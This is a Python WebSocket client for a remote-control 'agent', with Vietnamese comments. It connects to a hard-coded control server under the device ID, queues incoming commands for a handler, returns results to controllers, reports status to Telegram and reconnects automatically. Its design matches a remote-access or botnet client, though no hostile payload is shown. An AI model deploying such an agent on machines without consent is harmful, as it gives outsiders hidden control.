import asyncio
import json
import time
import threading
from websocket import WebSocketApp, WebSocketConnectionClosedException
from core.config import Config
from core.telegram_service import TelegramService
from core.command_handler import CommandHandler

SERVER_URL = "wss://control.imsteve.dev/ws"


class WebSocketClient:
    def __init__(self, on_chat_callback=None, on_status_callback=None):
        self.cfg = Config()
        self.telegram = TelegramService()
        self.handler = CommandHandler(self)
        self.on_chat_callback = on_chat_callback
        self.on_status_callback = on_status_callback

        self.ws = None
        self._should_reconnect = True
        self._is_reconnecting = False  # 🔒 tránh reconnect song song
        self._reconnect_delay = 5      # giây — sẽ tăng dần nếu thất bại
        self.controllers = {}
    # --------------------------------------------------
    # WebSocket Event Handlers
    # --------------------------------------------------

    def _on_open(self, ws):
        print("✅ Connected to server")
        self.telegram.send_message("🟢 Agent đã kết nối server")
        self.telegram.send_message(f"{self.cfg.device_id}")
        self._reconnect_delay = 5      # reset delay khi kết nối lại thành công
        self._is_reconnecting = False  # cho phép reconnect lần sau nếu mất kết nối

        if self.on_status_callback:
            self.on_status_callback(True)

    def _on_message(self, ws, message):
        try:
            if not message or not message.strip():
                print("⚠️ Received empty WS message — skipping")
                return

            data = json.loads(message)
            print(f"Received: {data}")
            msg_type = data.get("type")
            
            if msg_type == "command":
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                loop.run_until_complete(self.handler.enqueue_command(data))
                loop.close()

            elif msg_type == "connect_success":
                controller_id = data.get("controller_id")
                if controller_id:
                    self.controllers[controller_id] = {"connected_at": time.time()}
                    print(f"✅ Controller connected: {controller_id}")
                    self.telegram.send_message(f"🤝 Connected to controller {controller_id}")
                return

            elif msg_type == "chat":
                msg = f"{data.get('from')}: {data.get('message')}"
                print(f"💬 Chat: {msg}")
                if self.on_chat_callback:
                    self.on_chat_callback(msg)
                self.telegram.send_message(f"💬 {msg}")

        except json.JSONDecodeError as e:
            print(f"⚠️ Invalid JSON message: {message!r} ({e})")
        except Exception as e:
            print(f"⚠️ Error handling WS message: {e}")

    def _on_close(self, ws, close_status_code, close_msg):
        print(f"⚠️ Disconnected from server ({close_status_code}): {close_msg}")
        if self.on_status_callback:
            self.on_status_callback(False)
        self._schedule_reconnect()

    def _on_error(self, ws, error):
        print(f"⚠️ WS error: {error}")
        if self.on_status_callback:
            self.on_status_callback(False)
        self._schedule_reconnect()

    # --------------------------------------------------
    # Reconnect Logic (với exponential backoff)
    # --------------------------------------------------

    def _schedule_reconnect(self):
        """Chỉ gọi reconnect nếu chưa có reconnect đang chạy."""
        if not self._should_reconnect:
            return
        if self._is_reconnecting:
            print("⏳ Reconnect already in progress — skipping")
            return

        self._is_reconnecting = True
        thread = threading.Thread(target=self._reconnect_loop, daemon=True)
        thread.start()

    def _reconnect_loop(self):
        """Thử reconnect với delay tăng dần (exponential backoff)."""
        while self._should_reconnect:
            print(f"🔁 Trying to reconnect in {self._reconnect_delay}s...")
            time.sleep(self._reconnect_delay)
            try:
                self.connect()
                # Nếu connect thành công, _on_open sẽ reset delay
                break
            except Exception as e:
                print(f"⚠️ Reconnect failed: {e}")
                self._reconnect_delay = min(self._reconnect_delay * 2, 60)  # giới hạn 60s

    # --------------------------------------------------
    # Connection & Messaging
    # --------------------------------------------------

    def connect(self):
        """Khởi tạo và chạy WebSocket connection"""
        uri = f"{SERVER_URL}/{self.cfg.device_id}"
        print(f"🌐 Connecting to {uri} ...")
        self.ws = WebSocketApp(
            uri,
            on_open=self._on_open,
            on_message=self._on_message,
            on_close=self._on_close,
            on_error=self._on_error,
        )
        thread = threading.Thread(target=self.ws.run_forever, daemon=True)
        thread.start()

    def send_chat(self, text: str):
        """Gửi tin nhắn chat"""
        if not self.ws:
            print("⚠️ No active connection")
            return
        try:
            payload = {"type": "chat", "message": text}
            if self.controllers:
                for cid in self.controllers.keys():
                    payload["to"] = cid
                    self.ws.send(json.dumps(payload))
                    print(f"📤 Broadcast chat to controller {cid}")
        except WebSocketConnectionClosedException:
            print("⚠️ Connection closed — scheduling reconnect")
            self._schedule_reconnect()
        except Exception as e:
            print(f"⚠️ Send chat failed: {e}")

    def send_result(self, payload: dict):
        """Gửi kết quả command"""
        if not self.ws:
            print("⚠️ No active connection")
            return
        try:
            packet = {}
            print(f"Controllers: {self.controllers}")
            if self.controllers:
                for cid in self.controllers.keys():
                    packet["to"] = cid
                    packet["client_id"] = cid
                    packet["agent_id"] = self.cfg.device_id
                    merged = {**packet, **payload}
                    self.ws.send(json.dumps(merged))
                    print(f"📤 Send response {merged}")
        except Exception as e:
            print(f"⚠️ Send result failed: {e}")

    def stop(self):
        """Ngắt kết nối thủ công"""
        self._should_reconnect = False
        self._is_reconnecting = False
        if self.ws:
            self.ws.close()
        print("🛑 WebSocket client stopped.")
